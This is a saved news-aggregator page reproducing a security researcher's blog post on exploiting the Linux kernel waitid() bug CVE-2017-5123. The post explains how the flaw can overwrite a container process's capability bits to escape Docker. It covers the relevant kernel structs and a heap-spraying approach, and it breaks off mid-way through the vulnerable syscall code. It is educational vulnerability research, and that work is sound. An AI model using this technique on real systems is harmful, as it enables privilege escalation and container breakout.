<!DOCTYPE html>
<!-- saved from url=(0092)https://news.radio-t.com/post/escaping-docker-container-using-waitid-cve-2017-5123-twistlock -->
<html lang="en" data-theme="day"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<style type="text/css">.gitter-hidden{box-sizing:border-box;display:none}.gitter-icon{box-sizing:border-box;width:22px;height:22px;fill:currentColor}.gitter-chat-embed{box-sizing:border-box;z-index:100;position:fixed;top:0;left:60%;bottom:0;right:0;display:-ms-flexbox;display:flex;-ms-flex-direction:row;flex-direction:row;background-color:#fff;border-left:1px solid #333;box-shadow:-12px 0 18px 0 rgba(50,50,50,.3);transition:transform .3s cubic-bezier(.16,.22,.22,1.7)}@context border-box{.gitter-chat-embed{box-sizing:border-box;background-color:#fff}}.gitter-chat-embed.is-collapsed:not(.is-loading){box-sizing:border-box;transform:translateX(110%)}.gitter-chat-embed:after{box-sizing:border-box;content:"";z-index:-1;position:absolute;top:0;left:100%;bottom:0;right:-100%;background-color:#fff}@context border-box{.gitter-chat-embed:after{box-sizing:border-box;background-color:#fff}}@media(max-width:1150px){.gitter-chat-embed{box-sizing:border-box;left:45%}}@media(max-width:944px){.gitter-chat-embed{box-sizing:border-box;left:30%}}@media(max-width:600px){.gitter-chat-embed{box-sizing:border-box;left:15%}}@media(max-width:500px){.gitter-chat-embed{box-sizing:border-box;left:0;border-left:none}}.gitter-chat-embed>iframe{box-sizing:border-box;-ms-flex:1;flex:1;width:100%;height:100%;border:0}.gitter-chat-embed-loading-wrapper{box-sizing:border-box;position:absolute;top:0;left:0;bottom:0;right:0;display:none;-ms-flex-pack:center;justify-content:center;-ms-flex-align:center;align-items:center}.is-loading .gitter-chat-embed-loading-wrapper{box-sizing:border-box;display:-ms-flexbox;display:flex}.gitter-chat-embed-loading-indicator{box-sizing:border-box;opacity:.75;background-image:url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxNzkyIDE3OTIiIGZpbGw9IiMzYTMxMzMiPjxwYXRoIGQ9Ik01MjYgMTM5NHEwIDUzLTM3LjUgOTAuNXQtOTAuNSAzNy41cS01MiAwLTkwLTM4dC0zOC05MHEwLTUzIDM3LjUtOTAuNXQ5MC41LTM3LjUgOTAuNSAzNy41IDM3LjUgOTAuNXptNDk4IDIwNnEwIDUzLTM3LjUgOTAuNXQtOTAuNSAzNy41LTkwLjUtMzcuNS0zNy41LTkwLjUgMzcuNS05MC41IDkwLjUtMzcuNSA5MC41IDM3LjUgMzcuNSA5MC41em0tNzA0LTcwNHEwIDUzLTM3LjUgOTAuNXQtOTAuNSAzNy41LTkwLjUtMzcuNS0zNy41LTkwLjUgMzcuNS05MC41IDkwLjUtMzcuNSA5MC41IDM3LjUgMzcuNSA5MC41em0xMjAyIDQ5OHEwIDUyLTM4IDkwdC05MCAzOHEtNTMgMC05MC41LTM3LjV0LTM3LjUtOTAuNSAzNy41LTkwLjUgOTAuNS0zNy41IDkwLjUgMzcuNSAzNy41IDkwLjV6bS05NjQtOTk2cTAgNjYtNDcgMTEzdC0xMTMgNDctMTEzLTQ3LTQ3LTExMyA0Ny0xMTMgMTEzLTQ3IDExMyA0NyA0NyAxMTN6bTExNzAgNDk4cTAgNTMtMzcuNSA5MC41dC05MC41IDM3LjUtOTAuNS0zNy41LTM3LjUtOTAuNSAzNy41LTkwLjUgOTAuNS0zNy41IDkwLjUgMzcuNSAzNy41IDkwLjV6bS02NDAtNzA0cTAgODAtNTYgMTM2dC0xMzYgNTYtMTM2LTU2LTU2LTEzNiA1Ni0xMzYgMTM2LTU2IDEzNiA1NiA1NiAxMzZ6bTUzMCAyMDZxMCA5My02NiAxNTguNXQtMTU4IDY1LjVxLTkzIDAtMTU4LjUtNjUuNXQtNjUuNS0xNTguNXEwLTkyIDY1LjUtMTU4dDE1OC41LTY2cTkyIDAgMTU4IDY2dDY2IDE1OHoiLz48L3N2Zz4=);animation:spin 2s infinite linear}@keyframes spin{0%{box-sizing:border-box;transform:rotate(0deg)}to{box-sizing:border-box;transform:rotate(359.9deg)}}.gitter-chat-embed-action-bar{box-sizing:border-box;position:absolute;top:0;left:0;right:0;display:-ms-flexbox;display:flex;-ms-flex-pack:end;justify-content:flex-end;padding-bottom:.7em;background:linear-gradient(180deg,#fff 0,#fff 50%,hsla(0,0%,100%,0))}.gitter-chat-embed-action-bar-item{box-sizing:border-box;display:-ms-flexbox;display:flex;-ms-flex-pack:center;justify-content:center;-ms-flex-align:center;align-items:center;width:40px;height:40px;padding-left:0;padding-right:0;opacity:.65;background:none;background-position:50%;background-repeat:no-repeat;background-size:22px 22px;border:0;outline:none;cursor:pointer;cursor:hand;transition:all .2s ease}.gitter-chat-embed-action-bar-item:focus,.gitter-chat-embed-action-bar-item:hover{box-sizing:border-box;opacity:1}.gitter-chat-embed-action-bar-item:active{box-sizing:border-box;filter:hue-rotate(80deg) saturate(150)}.gitter-chat-embed-action-bar-item-pop-out{box-sizing:border-box;margin-right:-4px;background-image:url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyMDAgMTcxLjQyOSIgZmlsbD0iIzNhMzEzMyI+PHBhdGggZD0iTTE1Ny4xNDMsMTAzLjU3MXYzNS43MTRjMCw4Ljg1NC0zLjE0NCwxNi40MjYtOS40MzEsMjIuNzEzcy0xMy44NTgsOS40MzEtMjIuNzEyLDkuNDMxSDMyLjE0MyBjLTguODU0LDAtMTYuNDI1LTMuMTQ0LTIyLjcxMi05LjQzMVMwLDE0OC4xNCwwLDEzOS4yODVWNDYuNDI5YzAtOC44NTQsMy4xNDQtMTYuNDI1LDkuNDMxLTIyLjcxMiBjNi4yODctNi4yODcsMTMuODU4LTkuNDMxLDIyLjcxMi05LjQzMWg3OC41NzJjMS4wNDEsMCwxLjg5NiwwLjMzNSwyLjU2NiwxLjAwNGMwLjY3LDAuNjcsMS4wMDQsMS41MjUsMS4wMDQsMi41NjdWMjUgYzAsMS4wNDItMC4zMzQsMS44OTctMS4wMDQsMi41NjdjLTAuNjcsMC42Ny0xLjUyNSwxLjAwNC0yLjU2NiwxLjAwNEgzMi4xNDNjLTQuOTExLDAtOS4xMTUsMS43NDktMTIuNjEyLDUuMjQ2IHMtNS4yNDYsNy43MDEtNS4yNDYsMTIuNjEydjkyLjg1NmMwLDQuOTExLDEuNzQ5LDkuMTE1LDUuMjQ2LDEyLjYxMnM3LjcwMSw1LjI0NSwxMi42MTIsNS4yNDVIMTI1YzQuOTEsMCw5LjExNS0xLjc0OCwxMi42MTEtNS4yNDUgYzMuNDk3LTMuNDk3LDUuMjQ2LTcuNzAxLDUuMjQ2LTEyLjYxMnYtMzUuNzE0YzAtMS4wNDIsMC4zMzQtMS44OTcsMS4wMDQtMi41NjdjMC42Ny0wLjY2OSwxLjUyNS0xLjAwNCwyLjU2Ny0xLjAwNGg3LjE0MyBjMS4wNDIsMCwxLjg5NywwLjMzNSwyLjU2NywxLjAwNEMxNTYuODA5LDEwMS42NzQsMTU3LjE0MywxMDIuNTI5LDE1Ny4xNDMsMTAzLjU3MXogTTIwMCw3LjE0M3Y1Ny4xNDMgYzAsMS45MzUtMC43MDcsMy42MDktMi4xMjEsNS4wMjJjLTEuNDEzLDEuNDE0LTMuMDg4LDIuMTIxLTUuMDIxLDIuMTIxYy0xLjkzNSwwLTMuNjA5LTAuNzA3LTUuMDIyLTIuMTIxbC0xOS42NDQtMTkuNjQzIGwtNzIuNzY3LDcyLjc2OWMtMC43NDQsMC43NDQtMS42LDEuMTE1LTIuNTY3LDEuMTE1cy0xLjgyMy0wLjM3MS0yLjU2Ny0xLjExNUw3Ny41NjcsMTA5LjcxYy0wLjc0NC0wLjc0NC0xLjExNi0xLjYtMS4xMTYtMi41NjcgYzAtMC45NjcsMC4zNzItMS44MjIsMS4xMTYtMi41NjZsNzIuNzY4LTcyLjc2OGwtMTkuNjQ0LTE5LjY0M2MtMS40MTMtMS40MTQtMi4xMi0zLjA4OC0yLjEyLTUuMDIyYzAtMS45MzUsMC43MDctMy42MDksMi4xMi01LjAyMiBDMTMyLjEwNSwwLjcwNywxMzMuNzc5LDAsMTM1LjcxNSwwaDU3LjE0M2MxLjkzNCwwLDMuNjA4LDAuNzA3LDUuMDIxLDIuMTIxQzE5OS4yOTMsMy41MzQsMjAwLDUuMjA4LDIwMCw3LjE0M3oiLz48L3N2Zz4=)}.gitter-chat-embed-action-bar-item-collapse-chat{box-sizing:border-box;background-image:url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxNzEuNDI5IDE3MS40MjkiIGZpbGw9IiMzYTMxMzMiPjxwYXRoIGQ9Ik0xMjIuNDMzLDEwNi4xMzhsLTE2LjI5NSwxNi4yOTVjLTAuNzQ0LDAuNzQ0LTEuNiwxLjExNi0yLjU2NiwxLjExNmMtMC45NjgsMC0xLjgyMy0wLjM3Mi0yLjU2Ny0xLjExNmwtMTUuMjktMTUuMjkgbC0xNS4yOSwxNS4yOWMtMC43NDQsMC43NDQtMS42LDEuMTE2LTIuNTY3LDEuMTE2cy0xLjgyMy0wLjM3Mi0yLjU2Ny0xLjExNmwtMTYuMjk0LTE2LjI5NWMtMC43NDQtMC43NDQtMS4xMTYtMS42LTEuMTE2LTIuNTY2IGMwLTAuOTY4LDAuMzcyLTEuODIzLDEuMTE2LTIuNTY3bDE1LjI5LTE1LjI5bC0xNS4yOS0xNS4yOWMtMC43NDQtMC43NDQtMS4xMTYtMS42LTEuMTE2LTIuNTY3czAuMzcyLTEuODIzLDEuMTE2LTIuNTY3IEw2NS4yOSw0OC45OTZjMC43NDQtMC43NDQsMS42LTEuMTE2LDIuNTY3LTEuMTE2czEuODIzLDAuMzcyLDIuNTY3LDEuMTE2bDE1LjI5LDE1LjI5bDE1LjI5LTE1LjI5IGMwLjc0NC0wLjc0NCwxLjYtMS4xMTYsMi41NjctMS4xMTZjMC45NjcsMCwxLjgyMiwwLjM3MiwyLjU2NiwxLjExNmwxNi4yOTUsMTYuMjk0YzAuNzQ0LDAuNzQ0LDEuMTE2LDEuNiwxLjExNiwyLjU2NyBzLTAuMzcyLDEuODIzLTEuMTE2LDIuNTY3bC0xNS4yOSwxNS4yOWwxNS4yOSwxNS4yOWMwLjc0NCwwLjc0NCwxLjExNiwxLjYsMS4xMTYsMi41NjcgQzEyMy41NDksMTA0LjUzOSwxMjMuMTc3LDEwNS4zOTQsMTIyLjQzMywxMDYuMTM4eiBNMTQ2LjQyOSw4NS43MTRjMC0xMS4wMTItMi43MTctMjEuMTY4LTguMTQ4LTMwLjQ2OSBzLTEyLjc5Ny0xNi42NjctMjIuMDk4LTIyLjA5OFM5Ni43MjYsMjUsODUuNzE0LDI1cy0yMS4xNjgsMi43MTYtMzAuNDY5LDguMTQ3UzM4LjU3OSw0NS45NDUsMzMuMTQ3LDU1LjI0NlMyNSw3NC43MDMsMjUsODUuNzE0IHMyLjcxNiwyMS4xNjgsOC4xNDcsMzAuNDY5czEyLjc5NywxNi42NjYsMjIuMDk4LDIyLjA5OHMxOS40NTcsOC4xNDgsMzAuNDY5LDguMTQ4czIxLjE2OC0yLjcxNywzMC40NjktOC4xNDggczE2LjY2Ni0xMi43OTcsMjIuMDk4LTIyLjA5OFMxNDYuNDI5LDk2LjcyNiwxNDYuNDI5LDg1LjcxNHogTTE3MS40MjksODUuNzE0YzAsMTUuNTUxLTMuODMyLDI5Ljg5My0xMS40OTYsNDMuMDI0IGMtNy42NjQsMTMuMTMzLTE4LjA2MiwyMy41My0zMS4xOTQsMzEuMTk0Yy0xMy4xMzIsNy42NjQtMjcuNDc0LDExLjQ5Ni00My4wMjQsMTEuNDk2cy0yOS44OTItMy44MzItNDMuMDI0LTExLjQ5NiBjLTEzLjEzMy03LjY2NC0yMy41MzEtMTguMDYyLTMxLjE5NC0zMS4xOTRDMy44MzIsMTE1LjYwNywwLDEwMS4yNjUsMCw4NS43MTRTMy44MzIsNTUuODIyLDExLjQ5Niw0Mi42OSBjNy42NjQtMTMuMTMzLDE4LjA2Mi0yMy41MzEsMzEuMTk0LTMxLjE5NEM1NS44MjIsMy44MzIsNzAuMTY0LDAsODUuNzE0LDBzMjkuODkzLDMuODMyLDQzLjAyNCwxMS40OTYgYzEzLjEzMyw3LjY2NCwyMy41MywxOC4wNjIsMzEuMTk0LDMxLjE5NEMxNjcuNTk3LDU1LjgyMiwxNzEuNDI5LDcwLjE2NCwxNzEuNDI5LDg1LjcxNHoiLz48L3N2Zz4=)}.gitter-open-chat-button{z-index:100;position:fixed;bottom:0;right:10px;padding:1em 3em;background-color:#36bc98;border:0;border-top-left-radius:.5em;border-top-right-radius:.5em;font-family:sans-serif;font-size:12px;letter-spacing:1px;text-transform:uppercase;text-align:center;text-decoration:none;cursor:pointer;cursor:hand;transition:all .3s ease}.gitter-open-chat-button,.gitter-open-chat-button:visited{box-sizing:border-box;color:#fff}.gitter-open-chat-button:focus,.gitter-open-chat-button:hover{box-sizing:border-box;background-color:#3ea07f;color:#fff}.gitter-open-chat-button:focus{box-sizing:border-box;box-shadow:0 0 8px rgba(62,160,127,.6);outline:none}.gitter-open-chat-button:active{box-sizing:border-box;color:#eee}.gitter-open-chat-button.is-collapsed{box-sizing:border-box;transform:translateY(120%)}</style>
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta http-equiv="X-UA-Compatible" content="ie=edge">
	<meta name="viewport" content="width=device-width">
	<meta name="viewport" content="initial-scale=1.0">
	<link rel="preconnect" href="https://fonts.gstatic.com/">
	<link rel="preconnect" href="https://news.radio-t.com/api/v1">
	<!-- "sha256-Nx/Fn..." is for window.gitter... script-->
	<meta http-equiv="Content-Security-Policy" content="script-src &#39;self&#39; &#39;sha256-Nx/FneFzi+7zpN8NmqqAINLvfA40iGAj/Svrnw/SJiY=&#39; https://sidecar.gitter.im/dist/sidecar.v1.js">
	<title>Escaping Docker container using waitid() - CVE-2017-5123 | Twistlock | Новости Радио-Т</title>

	<link rel="alternate" type="application/rss+xml" title="Новости для Радио-Т" href="https://news.radio-t.com/rss">
	<link rel="shortcut icon" href="https://news.radio-t.com/static/favicon.ico">
<link href="./2017 - Escaping Docker container using waitid() – CVE-2017-5123_files/main.css" rel="stylesheet"></head>
	<body>
		<div class="app"><div class="page"><div class="header wrapper page__header"><h1 class="title header__title">Новости для <span class="no-break">Радио-Т</span><span class="header__issue-number"><a href="https://radio-t.com/p/2021/11/30/prep-783/#remark42" title="Темы слушателей">783</a></span></h1><ul class="navigation header__navigation" role="navigation" aria-label="Main navigation"><li class="navigation__item navigation__item_user"><a class="link navigation__item-link" href="https://news.radio-t.com/" style="">Все темы</a></li><li class="navigation__item"><a class="link navigation__item-link" href="https://news.radio-t.com/archive/" style="">Архив</a></li><li class="navigation__item navigation__item_to-comments"><a class="pseudo navigation__item-link" href="https://news.radio-t.com/post/escaping-docker-container-using-waitid-cve-2017-5123-twistlock#to-comments">К комментариям</a></li><li class="navigation__item navigation__rss"><a href="https://news.radio-t.com/rss" class="navigation__rss-link" title="Фид новостей"><span class="SVGInline navigation__rss-icon"><svg class="SVGInline-svg navigation__rss-icon-svg" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><circle cx="4" cy="28" r="4" fill="currentColor #888" stroke="none"></circle><circle cx="0" cy="32" r="17" fill="none" stroke="currentColor #888" stroke-width="6"></circle><circle cx="0" cy="32" r="28" fill="none" stroke="currentColor #888" stroke-width="6"></circle></svg></span></a></li><button title="Поставить ночную тему" class="inline-button navigation__item navigation__theme-switcher"><span class="SVGInline icon navigation__theme-switcher-icon"><svg class="SVGInline-svg icon-svg navigation__theme-switcher-icon-svg" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path d="M16 2 C34 5, 34 27, 16 30" fill="hsl(200, 2%, 10%)"></path><circle cx="16" cy="16" r="13" fill="none" stroke="hsl(200, 2%, 10%)" stroke-width="2" stroke-location="inside"></circle></svg></span></button></ul><hr></div><div class="content page__content"><article class="article"><div><h3 class="title article__title"><span title="Гиковская тема" class="SVGInline icon post__title-geek-icon"><svg class="SVGInline-svg icon-svg post__title-geek-icon-svg" viewBox="0 0 1792 1792" xmlns="http://www.w3.org/2000/svg"><path fill="currentColor #000" d="M1152 896q0-106-75-181t-181-75-181 75-75 181 75 181 181 75 181-75 75-181zm512-109v222q0 12-8 23t-20 13l-185 28q-19 54-39 91 35 50 107 138 10 12 10 25t-9 23q-27 37-99 108t-94 71q-12 0-26-9l-138-108q-44 23-91 38-16 136-29 186-7 28-36 28h-222q-14 0-24.5-8.5t-11.5-21.5l-28-184q-49-16-90-37l-141 107q-10 9-25 9-14 0-25-11-126-114-165-168-7-10-7-23 0-12 8-23 15-21 51-66.5t54-70.5q-27-50-41-99l-183-27q-13-2-21-12.5t-8-23.5v-222q0-12 8-23t19-13l186-28q14-46 39-92-40-57-107-138-10-12-10-24 0-10 9-23 26-36 98.5-107.5t94.5-71.5q13 0 26 10l138 107q44-23 91-38 16-136 29-186 7-28 36-28h222q14 0 24.5 8.5t11.5 21.5l28 184q49 16 90 37l142-107q9-9 24-9 13 0 25 10 129 119 165 170 7 8 7 22 0 12-8 23-15 21-51 66.5t-54 70.5q26 50 41 98l183 28q13 2 21 12.5t8 23.5z"></path></svg></span><a class="post__title-link" href="https://www.twistlock.com/2017/12/27/escaping-docker-container-using-waitid-cve-2017-5123/">Escaping Docker container using waitid() - CVE-2017-5123 | Twistlock</a></h3><div class="post__meta article__meta"><a class="post__original-link" href="https://www.twistlock.com/2017/12/27/escaping-docker-container-using-waitid-cve-2017-5123/" title="https://www.twistlock.com/2017/12/27/escaping-docker-container-using-waitid-cve-2017-5123/" target="_blank">www.twistlock.com</a><span class="post__timestamp" title="2018-01-01T09:35:32.511Z">01.01.2018 в&nbsp;17:35</span></div></div><div class="article-content article__content"><div><div>

    <div class="post-author-info">
      <p class="post-author-img" style="background-image: url(https://www.twistlock.com/wp-content/uploads/2017/12/22688906_10212548407357948_8187252496238917528_n-150x150.jpg);"></p>
      <p class="post-date">Dec 27, 2017</p><div class="post-author-name">by
        <a href="https://www.twistlock.com/about-us/team/daniel-shapira">
          </a><a href="https://www.twistlock.com/author/daniel-shapira/" title="Posts by Daniel Shapira" class="author url fn" rel="author">Daniel Shapira</a>        
      </div>

      <span class="social-share">share: <div class="heateor_sss_sharing_container heateor_sss_horizontal_sharing" ss-offset="0" heateor-sss-data-href="https://www.twistlock.com/2017/12/27/escaping-docker-container-using-waitid-cve-2017-5123/"><ul class="heateor_sss_sharing_ul"></ul></div></span>
    </div>

    <p>This post describes how I exploited the <code>waitid()</code> vulnerability in order to modify the <a href="https://www.kernel.org/pub/linux/libs/security/linux-privs/kernel-2.2/capfaq-0.2.txt">Linux capabilities</a> of a Docker container to gain elevated privileges, and ultimately escape the container jail.</p>
<p>But before we dive in, since an image is worth a thousand words, here is my exploit in action. It modifies the containerized process capabilities structure in memory, resulting in a gain of <code>CAP_SYS_ADMIN</code> and <code>CAP_NET_ADMIN</code> capabilities. This results in the ability to enable promiscuous mode on <code>eth0</code> ( docker bridge for the container):</p>
<p>&nbsp;</p>
<p><iframe width="960" height="540" src="./2017 - Escaping Docker container using waitid() – CVE-2017-5123_files/IdRDFS4u2rQ.html" frameborder="0" gesture="media" allow="encrypted-media" allowfullscreen=""></iframe></p>
<p>Note that I have turned off<b> </b><code>Kernel ASLR</code> for the recording, but it also works with <code>KASLR</code> as we can find the kernel base and the heap base by using the same vulnerability.</p>
<p>&nbsp;</p>
<p><a href="https://access.redhat.com/security/cve/cve-2017-5123">CVE-2017-5123</a> was published earlier this year on Oct 12 — it was a Linux kernel vulnerability in the <a href="http://uw714doc.sco.com/en/man/html.2/waitid.2.html"><b>waitid()</b></a> syscall for 4.12-4.13 kernel versions. The <code>waitid() </code>syscall defined as :</p>
<p></p><pre>int waitid(idtype_t idtype, id_t id, siginfo_t *infop, int options);</pre><p></p>
<p>The vulnerability allows an attacker to write a partially-controlled data to kernel memory address of his choice. The kernel memory address can be provided as the <code>infop</code> pointer above. The pointer points to a <code>struct siginfo</code> described below. In this struct we can control several variables, specifically <b></b><code>pid</code> and <code>status</code><i>.</i></p>
<p>As you can see below, the control is rather indirect.<br>
</p><pre>struct siginfo {
&nbsp;&nbsp;&nbsp;&nbsp;int si_signo;
&nbsp;&nbsp;&nbsp;&nbsp;int si_errno;
&nbsp;&nbsp;&nbsp;&nbsp;int si_code;
&nbsp;&nbsp;&nbsp;&nbsp;int padding;&nbsp;&nbsp; // this remains unchanged by waitid
&nbsp;&nbsp;&nbsp;&nbsp;int pid;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // process id
&nbsp;&nbsp;&nbsp;&nbsp;int uid;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // user id
&nbsp;&nbsp;&nbsp;&nbsp;int status;&nbsp;&nbsp;&nbsp;&nbsp;// return code
}
</pre><br>
Most of the values cannot be controlled by us or are limited in their size for our needs, however we can control the <code>pid</code> value by creating a lot of processes with the help of <code>fork()</code> or <code>clone()</code> until we hit the desired <code>pid</code> value. Still, we are limited by the <code>PID_MAX</code> value of the system, which is by default configured to be <code>32768</code> which equals to <code>0x8000</code> in hex.<p></p>
<p>Note: In a non-containerized environment we could elevate this number after changing our <code>uid</code> to 0 and gain root privileges, as we could modify <code>/proc/sys/kernel/pid_max</code> to any number.</p>
<p><img class="alignnone size-full wp-image-5852" src="./2017 - Escaping Docker container using waitid() – CVE-2017-5123_files/pid_max.png" alt="" width="730" height="54" srcset="https://www.twistlock.com/wp-content/uploads/2017/12/pid_max.png 730w, https://www.twistlock.com/wp-content/uploads/2017/12/pid_max-300x22.png 300w" sizes="(max-width: 730px) 100vw, 730px"></p>
<h2><b>Linux Capabilities </b></h2>
<p>In this section I’ll focus on a short overview of Linux capabilities – what they are, how Docker uses them, and how they are represented in the memory.</p>
<p>The code snippet below is taken from <a href="https://github.com/torvalds/linux/blob/master/include/linux/cred.h"><i>linux/cred.h</i></a> and is the definition of the credentials struct that each process has:<br>
</p><pre>struct cred {
&nbsp;&nbsp;&nbsp;&nbsp;atomic_t&nbsp;&nbsp;&nbsp;&nbsp;usage;
#ifdef CONFIG_DEBUG_CREDENTIALS
&nbsp;&nbsp;&nbsp;&nbsp;atomic_t&nbsp;&nbsp;&nbsp;&nbsp;subscribers;&nbsp;&nbsp;&nbsp;&nbsp;/* number of processes subscribed */
&nbsp;&nbsp;&nbsp;&nbsp;void&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*put_addr;
&nbsp;&nbsp;&nbsp;&nbsp;unsigned&nbsp;&nbsp;&nbsp;&nbsp;magic;
#define CRED_MAGIC&nbsp;&nbsp;&nbsp;&nbsp;0x43736564
#define CRED_MAGIC_DEAD&nbsp;&nbsp;&nbsp;&nbsp;0x44656144
#endif
&nbsp;&nbsp;&nbsp;&nbsp;kuid_t&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;uid;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/* real UID of the task */
&nbsp;&nbsp;&nbsp;&nbsp;kgid_t&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;gid;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/* real GID of the task */
&nbsp;&nbsp;&nbsp;&nbsp;kuid_t&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;suid;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/* saved UID of the task */
&nbsp;&nbsp;&nbsp;&nbsp;kgid_t&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sgid;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/* saved GID of the task */
&nbsp;&nbsp;&nbsp;&nbsp;kuid_t&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;euid;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/* effective UID of the task */
&nbsp;&nbsp;&nbsp;&nbsp;kgid_t&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;egid;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/* effective GID of the task */
&nbsp;&nbsp;&nbsp;&nbsp;kuid_t&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fsuid;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/* UID for VFS ops */
&nbsp;&nbsp;&nbsp;&nbsp;Kgid_t&nbsp;&nbsp;&nbsp;&nbsp;fsgid; /* GID for VFS ops */
&nbsp;&nbsp;&nbsp;&nbsp;Unsigned&nbsp;&nbsp;&nbsp;&nbsp;securebits; /* SUID-less security management */
&nbsp;&nbsp;&nbsp;&nbsp;Kernel_cap_t&nbsp;&nbsp;&nbsp;&nbsp;cap_inheritable; /* caps our children can inherit */
&nbsp;&nbsp;&nbsp;&nbsp;Kernel_cap_t&nbsp;&nbsp;&nbsp;&nbsp;cap_permitted;&nbsp;&nbsp;&nbsp;&nbsp;/* caps we're permitted */
&nbsp;&nbsp;&nbsp;&nbsp;Kernel_cap_t&nbsp;&nbsp;&nbsp;&nbsp;cap_effective;&nbsp;&nbsp;&nbsp;&nbsp;/* caps we can actually use */
&nbsp;&nbsp;&nbsp;&nbsp;Kernel_cap_t&nbsp;&nbsp;&nbsp;&nbsp;cap_bset; /* capability bounding set */
&nbsp;&nbsp;&nbsp;&nbsp;kernel_cap_t&nbsp;&nbsp;&nbsp;&nbsp;cap_ambient; /* Ambient capability set */

</pre><br>
<strong>man capabilities:</strong><p></p>
<blockquote><p>Starting with kernel 2.2, Linux divides the privileges traditionally associated with superuser into distinct units, known as <i>capabilities</i>, which can be independently enabled and disabled.<br>
Capabilities are a per-thread attribute.</p></blockquote>
<p>Linux capabilities are stored inside each process’s own <code>cred struct</code> and represented by a bitmask. For example all caps enabled would be represented by a bitmask of <code>0xFFFFFFFFFFFFFFFF</code>.</p>
<p>Each capability provides a different set of permissions, for instance:</p>
<p><code>CAP_SYS_MODULE</code> &nbsp;– allows for loading &amp; unloading kernel modules.</p>
<p><code>CAP_NET_ADMIN</code> – allows for various network operations. For example entering promiscuous mode, interface configuration and more.</p>
<p><code>CAP_SYS_ADMIN</code> – enables a range of system administration operations such as quotactl, mount, umount, swapon, setdomainname, ptrace and much more (this cap gives the most privileges and overloads others).</p>
<p>You can find the full list of CAPS <a href="http://man7.org/linux/man-pages/man7/capabilities.7.html">over here</a>.</p>
<p>&nbsp;</p>
<p>Docker uses capabilities to provide a better isolation for containers. It simply drops capabilities that would enable container escape. For example, you will rarely see a container that is running out-of-the-box with any of the 3 capabilities above, as it would be a security concern if a container could access the network interface and sniff the traffic of other containers or the host itself, or if a user inside the container could mount directories on the host and load kernel modules.</p>
<p>Although it might be easier to build a <a href="https://en.wikipedia.org/wiki/Return-oriented_programming">ROP chain</a> and call <code>commit_creds(0)</code> in order to gain root with full capabilities, in order to learn more about heap spraying, I decided to go with the blind exploitation method by spraying the kernel heap with thousands of <code>struct creds</code> like Federico did. The downside of the this exploit is that full caps are impossible to reach as we are not in control of what we are writing (we are limited to 0x8000) and the value of <code>0xFFFFFFFFFFFFFFFF</code> is out of reach for us.</p>
<h2><b>The vulnerability</b></h2>
<p>The code snippet below is taken from<a href="https://github.com/torvalds/linux/blob/master/kernel/exit.c#L1596"> <i>kernel/exit.c</i></a> and is in charge of handling the <code>waitid()</code> syscall:<br>
</p><pre>SYSCALL_DEFINE5(waitid, int, which, pid_t, upid, struct siginfo __user *,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;infop, int, options, struct rusage __user *, ru)
{
&nbsp;&nbsp;&nbsp;&nbsp;struct rusage r;
&nbsp;&nbsp;&nbsp;&nbsp;struct waitid_info info = {.status = 0};
&nbsp;&nbsp;&nbsp;&nbsp;long err = kernel_waitid(which, upid, &amp;info, options, ru ? &amp;r : NULL);
&nbsp;&nbsp;&nbsp;&nbsp;int signo = 0;

&nbsp;&nbsp;&nbsp;&nbsp;if (err &gt; 0) {
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;signo = SIGCHLD;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;err = 0;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (ru &amp;&amp; copy_to_user(ru, &amp;r, sizeof(struct rusage)))
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return -EFAULT;
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;if (!infop)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return err;

&nbsp;&nbsp;&nbsp;&nbsp;if (!access_ok(VERIFY_WRITE, infop, sizeof(*infop)))
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return -EFAULT;

